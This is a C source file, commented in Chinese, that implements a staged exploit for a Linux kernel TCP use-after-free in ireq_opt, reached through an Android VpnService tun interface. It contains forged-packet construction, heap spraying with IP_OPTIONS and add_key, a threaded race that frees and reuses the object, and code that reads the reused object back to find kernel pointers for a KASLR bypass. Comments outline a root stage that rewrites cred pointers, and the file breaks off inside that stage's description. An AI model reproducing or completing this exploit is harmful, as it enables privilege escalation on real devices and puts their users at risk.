/*
 * CVE-2026-98432 — ireq_opt use-after-free (6.6.118 / f72a02f47f4b)
 *
 * 输入侧走 VpnService 的 tun：把伪造的 SYN 写进 tun，内核当成本地入站处理，
 * 于是无需 CAP_NET_RAW 也能把带 IP 选项的报文塞进 tcp_v4_save_options()。
 *
 * 漏洞点在握手完成时：请求 sock 的 ireq_opt 被直接交给子 socket，子 socket
 * 销毁时以裸 kfree() 释放；而 SYNACK 重传定时器那条路径在 inet_csk_route_req()
 * 里拿到同一个指针，直到 ip_build_and_send_pkt()/ip_options_build() 末尾才 memcpy。
 * 两次读之间对象被释放并复用 → 读到的 optlen 与 __data 来自别人的对象。
 *
 * 本文件按阶段推进，每阶段都能单独跑，失败不 panic（PANIC_ON_OOPS=y 的机器
 * 上尤其重要）：
 *   probe  —— 只验通道：发 SYN、收 SYNACK、确认选项原样回来
 *   race   —— 边喷淋边打竞态，命中只表现为 SYNACK 选项长度异常
 *   leak   —— 命中后回读选项区，判定复用并挑出内核 .text 指针候选
 *   root   —— 拿 base + cred 指针改写（**尚未实现**，Kotlin 侧默认拒绝）
 *
 * 用法：libsynopt.so --tun-fd 3 --target 10.7.7.1 --port 47777 [--phase race]
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>

#include "synopt_offsets.h"

/* add_key / keyctl：用来做可控 optlen 的喷淋（见下方 root 阶段）。 */
#ifndef __NR_add_key
#define __NR_add_key 217
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 219
#endif

#define KEY_SPEC_PROCESS_KEYRING (-2)

#define WRITE_OPTLEN   56        /* 假 optlen：比第一次的 40 大 16 */
#define KEY_DATALEN    72        /* 0x18 + 72 = 96 → kmalloc-96 */
#define KEY_SPRAY_N    256

/* ------------------------------------------------------------------ 日志 */

static int g_verbose;

static void say(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    fflush(stderr);
}

#define FAIL(fmt, ...) do { say("FAIL: " fmt, ##__VA_ARGS__); } while (0)

/* ------------------------------------------------------------------ 参数 */

static int g_tun = -1;
static uint32_t g_dst;
/* 源地址必须落在 tun 子网内：SYNACK 要靠这个网段的路由回到 tun，
 * 否则内核会把回包发到真实网卡，我们读不到。README 里“源不在直连子网”
 * 那条是针对有 raw socket + 嗅探的攻击侧，tun 方案不适用。 */
static uint32_t g_src = 0x0a070763; /* 10.7.7.99 */
static uint16_t g_port = 47777;
static int g_rounds = 4000;

/* ------------------------------------------------------- 收发与环形缓冲 */

struct synack {
    /* 对端的随机源端口 —— 也就是我们发 SYN 时用的 sport，用来匹配本轮。
     * 名字故意不叫 sport/dport：内核回的包里它是目的端口，容易搞反。 */
    uint16_t peer;
    uint32_t ack;
    uint32_t seq;
    uint8_t optlen;
    uint8_t opts[64];
};

#define RING 256
static struct synack g_ring[RING];
static volatile unsigned g_head, g_tail;
static pthread_mutex_t g_ring_lock = PTHREAD_MUTEX_INITIALIZER;
static volatile int g_running = 1;
static volatile unsigned long g_tx, g_rx, g_synack, g_hit, g_clear, g_none;
/* 诊断用：凡是能从 tun 读到的包都计进 raw_rx，不管匹配不匹配。
 * raw_rx=0 说明包根本没回到 tun（投递方向或路由有问题），
 * raw_rx>0 但 synack=0 说明回来了但被过滤掉了 —— 两种故障完全不同。 */
static volatile unsigned long g_raw_rx, g_icmp_rx;
static uint8_t g_raw_first[64];
static size_t g_raw_first_len;
static volatile unsigned g_raw_proto;

/* 校验和要分两步：先把各段原样求和，最后统一取反一次。
 *
 * 反码运算里 ~x ≡ -x（模 0xFFFF），所以“先取反再当 init 传进去”算出来的
 * 是 ph_sum - tcp_sum，而不是 -(ph_sum + tcp_sum) —— 每个包都会被内核
 * 当成校验和错误静默丢弃。之前 synack=0 就是这个原因。 */
static uint32_t csum_raw(const void *data, size_t len) {
    const uint16_t *p = data;
    uint32_t s = 0;
    while (len > 1) { s += *p++; len -= 2; }
    if (len) s += *(const uint8_t *)p;
    return s;
}

static uint16_t csum_fold(uint32_t s) {
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)~s;
}

static uint16_t csum(const void *data, size_t len) {
    return csum_fold(csum_raw(data, len));
}

/* 40 字节 RR 选项：len=39 + 末尾 NOP；第 3 字节起是 4 字节标记 */
static void build_opts(uint8_t *o, uint32_t tag) {
    memset(o, 1, OPT_MAXLEN);
    o[0] = 7;
    o[1] = OPT_MAXLEN - 1;
    o[2] = 4;
    o[3] = (uint8_t)(tag >> 24);
    o[4] = (uint8_t)(tag >> 16);
    o[5] = (uint8_t)(tag >> 8);
    o[6] = (uint8_t)tag;
}

static size_t build_pkt(uint8_t *buf, uint16_t sport, uint32_t seq, uint32_t ack, uint8_t flags) {
    uint8_t opts[OPT_MAXLEN];
    build_opts(opts, 0x52550000u | (seq & 0xffff));

    size_t ihl = 20 + OPT_MAXLEN, total = ihl + 20;
    memset(buf, 0, total);
    buf[0] = (uint8_t)(0x40 | (ihl / 4));
    buf[1] = 0;
    *(uint16_t *)(buf + 2) = htons((uint16_t)total);
    *(uint16_t *)(buf + 4) = (uint16_t)(0x4000 + (seq & 0x3fff));
    buf[8] = 64;
    buf[9] = 6;
    *(uint32_t *)(buf + 12) = g_src;
    *(uint32_t *)(buf + 16) = g_dst;
    memcpy(buf + 20, opts, OPT_MAXLEN);
    *(uint16_t *)(buf + 10) = csum(buf, 20 + OPT_MAXLEN);

    uint8_t *tcp = buf + ihl;
    *(uint16_t *)(tcp + 0) = htons(sport);
    *(uint16_t *)(tcp + 2) = htons(g_port);
    *(uint32_t *)(tcp + 4) = htonl(seq);
    *(uint32_t *)(tcp + 8) = htonl(ack);
    tcp[12] = 5 << 4;
    tcp[13] = flags;
    *(uint16_t *)(tcp + 14) = htons(0xffff);
    uint8_t ph[12];
    memcpy(ph, &g_src, 4);
    memcpy(ph + 4, &g_dst, 4);
    ph[8] = 0;
    ph[9] = 6;
    *(uint16_t *)(ph + 10) = htons(20);
    /* 伪头与 TCP 段各求原和，加起来只取反一次。 */
    uint32_t sum = csum_raw(ph, 12) + csum_raw(tcp, 20);
    *(uint16_t *)(tcp + 16) = csum_fold(sum);
    return total;
}

static void tx(const uint8_t *pkt, size_t len) {
    if (write(g_tun, pkt, len) > 0) g_tx++;
}

static void push(const struct synack *s) {
    unsigned next = (g_head + 1) % RING;
    if (next == g_tail) return;
    g_ring[g_head] = *s;
    g_head = next;
}

static int pop(struct synack *out) {
    if (g_tail == g_head) return 0;
    *out = g_ring[g_tail];
    g_tail = (g_tail + 1) % RING;
    return 1;
}

static void *reader(void *arg) {
    (void)arg;
    static uint8_t buf[2048];
    while (g_running) {
        ssize_t n = read(g_tun, buf, sizeof(buf));
        if (n <= 0) {
            if (n < 0 && (errno == EAGAIN || errno == EINTR)) continue;
            if (n == 0) break;
            continue;
        }
        if (n < 20) continue;
        /* 任何从 tun 读到的包都先记账，便于区分“没回来”和“被过滤”。 */
        if (g_raw_rx == 0) {
            size_t k = (size_t)n < sizeof(g_raw_first) ? (size_t)n : sizeof(g_raw_first);
            memcpy(g_raw_first, buf, k);
            g_raw_first_len = k;
            g_raw_proto = buf[9];
        }
        g_raw_rx++;
        if ((buf[0] >> 4) == 4 && buf[9] == 1) g_icmp_rx++;   /* ICMP */
        size_t ihl = (buf[0] & 0x0f) * 4;
        if ((buf[0] >> 4) != 4 || buf[9] != 6 || (size_t)n < ihl + 20) continue;
        if (*(uint32_t *)(buf + 16) != g_src) continue;
        const uint8_t *tcp = buf + ihl;
        uint16_t sport = ntohs(*(uint16_t *)(tcp + 0));
        uint16_t dport = ntohs(*(uint16_t *)(tcp + 2));
        uint8_t flags = tcp[13];
        /* 内核回的 SYNACK：源端口是监听端口 g_port，目的端口是我们随机选的
         * sport。之前查的是 dport == g_port，于是每个 SYNACK 都在这里被丢掉，
         * 表现就是 tx 涨而 synack 永远是 0。 */
        if (sport != g_port) continue;
        if ((flags & 0x12) != 0x12) continue; /* SYN+ACK */
        (void)dport;
        g_rx++;
        struct synack s;
        memset(&s, 0, sizeof(s));
        s.peer = dport;   /* SYNACK 的目的端口 = 我们的随机源端口 */
        s.seq = ntohl(*(uint32_t *)(tcp + 4));
        s.ack = ntohl(*(uint32_t *)(tcp + 8));
        size_t tcp_hdr = (tcp[12] >> 4) * 4;
        size_t optlen = ihl - 20;
        if (optlen > sizeof(s.opts)) optlen = sizeof(s.opts);
        s.optlen = (uint8_t)optlen;
        if (optlen) memcpy(s.opts, buf + 20, optlen);
        (void)tcp_hdr;
        pthread_mutex_lock(&g_ring_lock);
        push(&s);
        pthread_mutex_unlock(&g_ring_lock);
    }
    return NULL;
}

/* ------------------------------------------------------------ 喷射 */

/* 用 IP_OPTIONS 把 kmalloc-96 填成可控对象：每条选项前 4 字节是标记，
 * 选项整体照抄了 40 字节，所以复用发生后 SYNACK 会把我们的标记送回来。 */
#define SPRAY_SOCKS 192
static int g_spray[SPRAY_SOCKS];
static int g_spray_n;
static volatile int g_spray_run;
static pthread_t g_spray_thread;

/* 标记里的“代”：喷射线程每轮 +1，回读时能看出对象是哪一代的。 */
static volatile uint32_t g_spray_gen;

static int spray_alloc(uint32_t tag) {
    uint8_t opts[OPT_MAXLEN];
    memset(opts, 0, sizeof(opts));
    build_opts(opts, tag);
    int made = 0;
    for (int i = 0; i < SPRAY_SOCKS; i++) {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) break;
        if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, OPT_MAXLEN) < 0) {
            close(fd);
            continue;
        }
        g_spray[g_spray_n++] = fd;
        made++;
    }
    return made;
}

static void spray_free(void) {
    for (int i = 0; i < g_spray_n; i++) close(g_spray[i]);
    g_spray_n = 0;
}

/* 竞态用的喷淋源。
 *
 * leak 阶段用 IP_OPTIONS：只能写 40 字节，覆盖不到 optlen（+0x18），
 * 所以只适合“确认槽位被复用”。
 * root 阶段用 add_key：datalen=72 时 0x18+72=96 落 kmalloc-96，且
 * data[0] 正好压在 optlen 上，能构造出“第二次读到大 optlen”的条件。 */
enum spray_kind { SPRAY_IPOPT, SPRAY_KEY };
static enum spray_kind g_spray_kind = SPRAY_IPOPT;
static uint8_t g_fake_optlen = 40;

/* ---- add_key 喷射 ----
 *
 * 每个 key 占一个 kmalloc-96 槽位。key 本身要留在 keyring 里，槽位才不被
 * 立刻释放，所以喷完不能马上 unlink —— 留到进程退出再说。 */
static int32_t g_keys[KEY_SPRAY_N];
static int g_key_n;

static int key_spray(uint8_t fake_optlen, uint32_t tag) {
    uint8_t payload[KEY_DATALEN];
    memset(payload, 0, sizeof(payload));
    payload[0] = fake_optlen;                 /* → ip_options_rcu.optlen */
    payload[1] = 0x01;                        /* srr：让 ip_options_build 走 RR 分支 */
    payload[2] = 0x01;                        /* rr  */
    /* __data 从 payload[8] 开始，对应 ip_options_rcu+0x20 */
    memcpy(payload + 8, &tag, 4);

    int made = 0;
    for (int i = 0; i < KEY_SPRAY_N && g_key_n < KEY_SPRAY_N; i++) {
        static unsigned seq;
        char desc[32];
        snprintf(desc, sizeof(desc), "synopt-%d-%u", (int)getpid(), seq++);
        long r = syscall(__NR_add_key, "user", desc, payload, (size_t)KEY_DATALEN,
                         KEY_SPEC_PROCESS_KEYRING);
        if (r < 0) {
            if (errno == ENOSYS || errno == EACCES || errno == EPERM) {
                say("[key] add_key 不可用（errno=%d），这条喷射路径走不通", errno);
                return -1;
            }
            continue;
        }
        g_keys[g_key_n++] = (int32_t)r;
        made++;
    }
    return made;
}

static void key_spray_free(void) {
    /* KEYCTL_UNLINK = 9（不是 3；3 是 KEYCTL_READ）。参数：key, keyring */
    for (int i = 0; i < g_key_n; i++) {
        syscall(__NR_keyctl, 9 /* KEYCTL_UNLINK */, g_keys[i], KEY_SPEC_PROCESS_KEYRING);
    }
    g_key_n = 0;
}

/* 持续占位。
 *
 * 单发一次喷淋几乎不可能命中：被释放的槽位必须在 ip_build_and_send_pkt
 * 真正拷贝之前就被占住，中间只有微秒级窗口。所以竞态期间开一个线程不停
 * 地“关掉一批 → 重新分配一批”，让 kmalloc-96 一直有我们的对象进出。 */
static void *spray_worker(void *arg) {
    (void)arg;
    while (g_spray_run) {
        uint32_t gen = ++g_spray_gen;
        if (g_spray_kind == SPRAY_KEY) {
            key_spray_free();
            key_spray(g_fake_optlen, 0x53570000u | (gen & 0xffff));
        } else {
            spray_free();
            spray_alloc(0x53500000u | (gen & 0xffff));
        }
        usleep(200);
    }
    if (g_spray_kind == SPRAY_KEY) key_spray_free();
    else spray_free();
    return NULL;
}

static void spray_start(void) {
    if (g_spray_run) return;
    g_spray_run = 1;
    pthread_create(&g_spray_thread, NULL, spray_worker, NULL);
}

static void spray_stop(void) {
    if (!g_spray_run) return;
    g_spray_run = 0;
    pthread_join(g_spray_thread, NULL);
}

/* ------------------------------------------------------------ 通道自检
 *
 * 在打 TCP 之前先回答一个更基本的问题：往 tun 里写的包，内核到底收不收？
 *
 * 做法是发一个 ICMP echo request 到 tun 自己的地址。如果内核把包当成本地
 * 入站处理，它会直接回一个 echo reply —— 这条路径不牵扯监听套接字、不牵扯
 * TCP 校验和，是最干净的判据：
 *
 *   icmp reply 回来  → 投递方向是通的，问题在 TCP 层（端口/校验和/过滤）
 *   一个包都不回    → 包没有进入内核栈，问题在 VpnService 语义、路由或
 *                      rp_filter，再怎么调 TCP 参数都没用
 */
static size_t build_icmp_echo(uint8_t *buf) {
    const size_t ihl = 20, icmp_len = 8 + 16;
    const size_t total = ihl + icmp_len;
    memset(buf, 0, total);

    buf[0] = 0x45;
    *(uint16_t *)(buf + 2) = htons((uint16_t)total);
    *(uint16_t *)(buf + 4) = htons(0x1234);
    buf[8] = 64;
    buf[9] = 1;                    /* ICMP */
    *(uint32_t *)(buf + 12) = g_src;
    *(uint32_t *)(buf + 16) = g_dst;
    *(uint16_t *)(buf + 10) = csum(buf, ihl);

    uint8_t *icmp = buf + ihl;
    icmp[0] = 8;                   /* echo request */
    icmp[1] = 0;
    *(uint16_t *)(icmp + 4) = htons(0x5a5a);   /* id */
    *(uint16_t *)(icmp + 6) = htons(0x0001);   /* seq */
    for (int i = 0; i < 16; i++) icmp[8 + i] = (uint8_t)('a' + i);
    *(uint16_t *)(icmp + 2) = csum(icmp, icmp_len);
    return total;
}

static int channel_selftest(void) {
    uint8_t pkt[128];
    size_t len = build_icmp_echo(pkt);
    unsigned long before = g_icmp_rx;
    say("[chan] 发送 ICMP echo → 10.7.7.1（测试包能否进入内核栈）");
    tx(pkt, len);

    for (int i = 0; i < 30 && g_icmp_rx == before; i++) usleep(10 * 1000);

    if (g_icmp_rx > before) {
        say("[OK] 收到 ICMP echo reply：tun 投递方向正常");
        return 0;
    }
    say("[!] ICMP 没有回包 —— 包没有进入内核栈");
    say("[!] raw_rx=%lu（从 tun 读到的包总数）", g_raw_rx);
    if (g_raw_first_len) {
        char line[200];
        int off = snprintf(line, sizeof(line), "[!] 首个包 proto=%u len=%zu:", g_raw_proto, g_raw_first_len);
        for (size_t i = 0; i < g_raw_first_len && i < 32; i++)
            off += snprintf(line + off, sizeof(line) - off, " %02x", g_raw_first[i]);
        say("%s", line);
    }
    say("[!] 可能原因：tun 没把 10.7.7.0/24 路由进来、rp_filter 丢弃了伪造源、");
    say("[!]           或 VpnService 未处于已建立状态");
    return 1;
}

/* ------------------------------------------------------------ 监听端

 * 没有监听套接字，内核根本不会为这个端口建请求 sock：SYN 到达后直接回 RST，
 * tcp_v4_save_options() 不会被调用，ireq_opt 也就不存在。整条链的第一步
 * 是**真的在目标端口上 listen**，让内核走 tcp_conn_request 那条路。
 *
 * 端口选在 tun 子网的对端地址上：VpnService 已把 10.7.7.0/24 路由进 tun，
 * 绑定 10.7.7.1:g_port 之后，从 tun 投递进来的包会正常命中这个监听。
 */
static int g_listen_fd = -1;

static int listen_open(uint16_t port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        say("[listen] socket 失败 errno=%d", errno);
        return -1;
    }
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = g_dst;

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        say("[listen] bind %u.%u.%u.%u:%u 失败 errno=%d（地址还没配上？）",
            g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff,
            (g_dst >> 24) & 0xff, port, errno);
        close(fd);
        return -1;
    }
    if (listen(fd, 128) < 0) {
        say("[listen] listen 失败 errno=%d", errno);
        close(fd);
        return -1;
    }
    /* 非阻塞：accept 只在空闲时排空队列，不能把主流程卡住。 */
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    /* g_dst 是 inet_addr 的返回值，已经是网络序；按字节顺序打印才正确。 */
    say("[listen] 已在 %u.%u.%u.%u:%u 监听",
        g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff, port);
    return fd;
}

/* 把已完成握手的连接取出来立刻关掉，免得队列堆满。
 * 只关心“内核有没有建请求 sock”，accept 到东西本身就是证据。 */
static int listen_drain(void) {
    if (g_listen_fd < 0) return 0;
    int n = 0;
    for (;;) {
        int c = accept(g_listen_fd, NULL, NULL);
        if (c < 0) break;
        close(c);
        n++;
    }
    return n;
}

/* ------------------------------------------------------------ 单次请求 */

/* 发一个 SYN，等它的 SYNACK；返回 1 拿到、0 没有。 */
static int syn_round(uint16_t *sport_out, uint32_t *seq_out, struct synack *out) {
    uint8_t pkt[128];
    uint16_t sport = (uint16_t)(20000 + (rand() % 40000));
    uint32_t isn = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
    size_t len = build_pkt(pkt, sport, isn, 0, 0x02);
    tx(pkt, len);

    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (;;) {
        pthread_mutex_lock(&g_ring_lock);
        struct synack s;
        int got = pop(&s);
        pthread_mutex_unlock(&g_ring_lock);
        if (got && s.peer == sport && s.ack == isn + 1) {
            *sport_out = sport;
            *seq_out = isn;
            *out = s;
            return 1;
        }
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        long ms = (now.tv_sec - t0.tv_sec) * 1000 + (now.tv_nsec - t0.tv_nsec) / 1000000;
        /* 60ms 足够本地 tun 往返；原来 200ms × 4000 轮 = 13 分钟，
         * 收不到包时看起来就是卡死。 */
        if (ms > 60) return 0;
        usleep(100);
    }
}

/* 完成握手：ACK；随后 RST 让子 socket 销毁、触发 kfree。 */
static void complete(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
    uint8_t pkt[128];
    size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
    tx(pkt, len);
    len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x04);
    tx(pkt, len);
}

/* 只发 ACK，不发 RST。
 *
 * leak 阶段不能用 [complete]：RST 会走 inet_sock_destruct，把子 socket 的
 * inet_opt 再 kfree 一次；如果那时它指向的已经是我们的喷射对象，就是一次
 * double free —— 这台机器 CONFIG_PANIC_ON_OOPS=y，直接重启。 */
__attribute__((unused)) static void complete_ack_only(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
    uint8_t pkt[128];
    size_t len = build_pkt(pkt, sport, isn + 1, peer_seq + 1, 0x10);
    tx(pkt, len);
}

/* 取走环形缓冲里属于 sport 的所有 SYNACK，交给调用方判定。
 *
 * 竞态那条读路径的 SYNACK 带的是**本轮的源端口**（重传 SYN 用的就是同一个
 * sport），但下一轮 syn_round 会换一个随机端口，按端口过滤就会把它丢掉 ——
 * 原来命中永远看不到，根因就在这里。 */
static int drain_for(uint16_t sport, struct synack *out, int max) {
    int n = 0;
    for (;;) {
        pthread_mutex_lock(&g_ring_lock);
        struct synack s;
        int got = pop(&s);
        pthread_mutex_unlock(&g_ring_lock);
        if (!got) break;
        if (s.peer != sport) continue;
        if (n < max) out[n++] = s;
    }
    return n;
}

/* 竞态的两半，必须落在不同 CPU 上：
 *
 *   读侧：重传 SYN → tcp_conn_request → tcp_v4_send_synack，在 RCU 临界区里
 *         取 req->ireq_opt 并一直用到 ip_options_build 的 memcpy；
 *   写侧：ACK 完成握手把 ireq_opt 交给子 socket 并置空，紧跟 RST 让子 socket
 *         走 inet_sock_destruct 把它 kfree 掉。
 *
 * 上游修复是把这两处 kfree 改成 kfree_rcu，正是承认“读者在 RCU 里、写者
 * 直接 kfree”这件事本身不成立 —— 所以只要 kfree 落在读侧 load 之后、memcpy
 * 之前，就是一次 UAF 读。 */
struct pair_arg {
    uint8_t rtx[128], ack[128], rst[128];
    size_t rtx_len, ack_len, rst_len;
    pthread_barrier_t *bar;
};

static void *pair_thread(void *p) {
    struct pair_arg *a = p;
    pthread_barrier_wait(a->bar);
    tx(a->rtx, a->rtx_len);
    tx(a->ack, a->ack_len);
    tx(a->rst, a->rst_len);
    return NULL;
}

static void fire_pair(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
    struct pair_arg a;
    pthread_barrier_t bar;
    pthread_barrier_init(&bar, NULL, 3);
    a.bar = &bar;
    a.rtx_len = build_pkt(a.rtx, sport, isn, 0, 0x02);
    a.ack_len = build_pkt(a.ack, sport, isn + 1, peer_seq + 1, 0x10);
    a.rst_len = build_pkt(a.rst, sport, isn + 1, peer_seq + 1, 0x04);
    pthread_t t1, t2;
    pthread_create(&t1, NULL, pair_thread, &a);
    pthread_create(&t2, NULL, pair_thread, &a);
    pthread_barrier_wait(&bar);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_barrier_destroy(&bar);
}

/* ------------------------------------------------------------ 主流程 */

/* 自检：把构造出来的 SYN 用独立算法重新验证一遍。
 *
 * 校验和错了内核会静默丢弃，表现是 tx 涨但 synack 一直是 0，很难定位。
 * 所以在 probe 阶段先验一次，错了立刻报出来。 */
static int selfcheck_pkt(void) {
    uint8_t pkt[128];
    size_t total = build_pkt(pkt, 12345, 0x11223344, 0, 0x02);
    size_t ihl = (pkt[0] & 0x0f) * 4;

    /* IP 头校验和：把整个头再求一次，结果应为 0。 */
    if (csum_fold(csum_raw(pkt, 20 + OPT_MAXLEN)) != 0) {
        say("[selfcheck] IP 头校验和错误");
        return 1;
    }
    /* TCP：伪头 + 段一起求，结果应为 0。 */
    uint8_t ph[12];
    memcpy(ph, pkt + 12, 8);
    ph[8] = 0;
    ph[9] = 6;
    *(uint16_t *)(ph + 10) = htons((uint16_t)(total - ihl));
    uint32_t sum = csum_raw(ph, 12) + csum_raw(pkt + ihl, total - ihl);
    if (csum_fold(sum) != 0) {
        say("[selfcheck] TCP 校验和错误（内核会静默丢弃这些包）");
        return 1;
    }
    say("[selfcheck] 报文校验和正确（IP 头 + TCP 伪头）");
    return 0;
}

static int phase_probe(void) {
    if (selfcheck_pkt() != 0) return 1;
    for (int i = 0; i < 5; i++) {
        uint16_t sport;
        uint32_t isn;
        struct synack s;
        if (!syn_round(&sport, &isn, &s)) {
            say("probe %d: 没收到 SYNACK（累计 g_rx=%lu）", i, g_rx);
            continue;
        }
        if (s.optlen != OPT_MAXLEN) {
            say("probe %d: 选项长度 %u（预期 %u）", i, s.optlen, OPT_MAXLEN);
            continue;
        }
        say("probe %d: 选项 %u 字节原样返回，标记 %02x%02x", i, s.optlen, s.opts[3], s.opts[4]);
        complete(sport, isn, s.seq);
        return 0;
    }
    return 1;
}

struct hit_ctx {
    uint16_t sport;
    uint32_t isn;
    struct synack s;
};

/* ------------------------------------------------------ 泄露解析 */

/* 喷射对象里我们写死的标记：build_opts 把 tag 放在 opts[3..6]。
 * 复用发生后，SYNACK 的选项区就是这份数据的拷贝，所以看 opts[3..6] 即可。 */
#define SPRAY_TAG0 0x53

static int is_spray_tag(const struct synack *s) {
    return s->optlen >= 7 && s->opts[3] == SPRAY_TAG0;
}

/* 把回读到的选项区按 8 字节一组打印，方便人工判断是残留堆还是我们的对象。 */
static void dump_opts(const struct synack *s) {
    char line[192];
    int off = 0;
    off += snprintf(line + off, sizeof(line) - off, "  opts[%u]:", s->optlen);
    for (int i = 0; i < s->optlen && i < 48; i++) {
        off += snprintf(line + off, sizeof(line) - off, " %02x", s->opts[i]);
        if ((i + 1) % 16 == 0 && i + 1 < s->optlen) {
            say("%s", line);
            off = snprintf(line, sizeof(line), "           ");
        }
    }
    if (off > 0) say("%s", line);
}

/* 从回读数据里挑出像内核 .text 指针的 8 字节（KASLR 基址候选）。
 *
 * 只做“看起来像”的判断：aarch64 内核线性映射在 0xffff8... 到 0xffffc...
 * 之间，且低 12 位通常是页对齐。真正的基址换算要靠 offsets 表。 */
static int find_text_candidates(const struct synack *s, uint64_t *out, int max) {
    int n = 0;
    for (int i = 0; i + 8 <= s->optlen && n < max; i += 8) {
        uint64_t v = 0;
        memcpy(&v, s->opts + i, 8);
        if ((v >> 48) != 0xffff) continue;
        if ((v & 0xfff) != 0) continue;
        out[n++] = v;
    }
    return n;
}

/* 竞态：一边持续喷淋占位，一边把 ACK 与重传 SYN 对撞。
 *
 * 顺序很重要 —— 必须在喷淋已经跑起来之后再放 ACK，否则释放出来的槽位
 * 还是空的，回读到的是残留堆（或者根本读不到）。
 *
 * 另一件同样重要的事：重传路径的 SYNACK 带的是**本轮**的源端口，
 * 而下一轮 syn_round 会换一个随机端口。所以命中必须在 fire_pair 之后
 * 用 drain_for 当场收走，等下一轮再看就永远看不到。 */
static int phase_race(struct hit_ctx *hit) {
    if (selfcheck_pkt() != 0) return 1;

    int found = 0;
    int blind = 0;
    say("开始竞态：喷淋 %d 个对象/轮，最多 %d 轮", SPRAY_SOCKS, g_rounds);
    spray_start();
    for (int r = 0; r < g_rounds && !found; r++) {
        uint16_t sport;
        uint32_t isn;
        struct synack s;
        if (!syn_round(&sport, &isn, &s)) {
            g_none++;
            /* 连续 200 轮一个 SYNACK 都没收到，说明通道根本不通
             * （没监听、路由不对、或包没进 tun），继续空转没有意义。 */
            if (++blind >= 200) {
                say("[!] 连续 %d 轮收不到任何 SYNACK，判定通道不通", blind);
                say("[!] 检查：端口 %u 是否在 %u.%u.%u.%u 上 listen、tun 是否收到包",
                    g_port, g_dst & 0xff, (g_dst >> 8) & 0xff,
                    (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff);
                spray_stop();
                return 1;
            }
            continue;
        }
        blind = 0;
        g_synack++;
        if (s.optlen == 0) {
            g_clear++;
        } else if (s.optlen != OPT_MAXLEN) {
            g_hit++;
            say("命中 r=%d optlen=%u gen=%u", r, s.optlen, g_spray_gen);
            dump_opts(&s);
            hit->sport = sport;
            hit->isn = isn;
            hit->s = s;
            found = 1;
            spray_stop();
            break;
        }
        /* 把 SYN / ACK / RST 对撞：ACK 让 ireq_opt 交给子 socket 并置空，
         * RST 紧跟其后让子 socket 销毁触发 kfree；重传 SYN 走
         * tcp_v4_send_synack 那条 RCU 读路径。 */
        fire_pair(sport, isn, s.seq);
        usleep(1500);
        listen_drain();

        /* 重传那条路径的 SYNACK 带的是本轮 sport，必须在这里收，不能等下一轮。 */
        struct synack late[8];
        int late_n = drain_for(sport, late, 8);
        for (int i = 0; i < late_n; i++) {
            struct synack *ls = &late[i];
            if (ls->optlen == 0) { g_clear++; continue; }
            if (ls->optlen == OPT_MAXLEN) continue;
            g_hit++;
            say("命中（重传路径）r=%d optlen=%u gen=%u", r, ls->optlen, g_spray_gen);
            dump_opts(ls);
            hit->sport = sport;
            hit->isn = isn;
            hit->s = *ls;
            found = 1;
            spray_stop();
            break;
        }
        if (found) break;
        if (g_verbose && (r % 100) == 0)
            say("r=%d synack=%lu hit=%lu clear=%lu none=%lu spray_gen=%u",
                r, g_synack, g_hit, g_clear, g_none, g_spray_gen);
    }
    if (!found) spray_stop();
    return found ? 0 : 1;
}

/* 泄露：命中的 SYNACK 本身就是回读结果，不需要再发包。
 *
 * 这里刻意不发 ACK/RST：那个请求 sock 的 ireq_opt 可能已经指向我们的
 * 喷射对象，再走一次 inet_sock_destruct 就是 double free，在
 * PANIC_ON_OOPS=y 的机器上直接重启。 */
static int phase_leak(struct hit_ctx *hit) {
    /* complete_ack_only 保留给以后需要的阶段 */
    say("回读命中对象：");
    dump_opts(&hit->s);

    /* 喷淋在命中时已经停了；这里只做判定，不再动它。 */
    uint64_t cand[8];
    int n = find_text_candidates(&hit->s, cand, 8);
    if (is_spray_tag(&hit->s)) {
        say("对象已被喷淋占据（标记 0x%02x），说明复用成功", SPRAY_TAG0);
        say("但内容是我们自己写的，没有泄露价值；下一轮要靠残留堆读内核指针");
        return 1;
    }
    if (n > 0) {
        for (int i = 0; i < n; i++) say("  内核指针候选[%d] = %#llx", i, (unsigned long long)cand[i]);
        return 0;
    }
    say("没有挑出内核指针候选（optlen=%u）", hit->s.optlen);
    return 1;
}

/* ============================================================ root 阶段
 *
 * ---- 写原语的来源 ----
 *
 * ip_build_and_send_pkt 对同一个 opt 读了两次 optlen（见 synopt_offsets.h）：
 *   第一次 → 决定 skb_push 预留多少 headroom；
 *   第二次 → 作为 ip_options_build 里 memcpy 的长度。
 * 两次之间隔着 skb_push，没有加锁。让两次读到不同的值，memcpy 就写穿预留区。
 *
 * ---- 怎么让两次读到不同的值 ----
 *
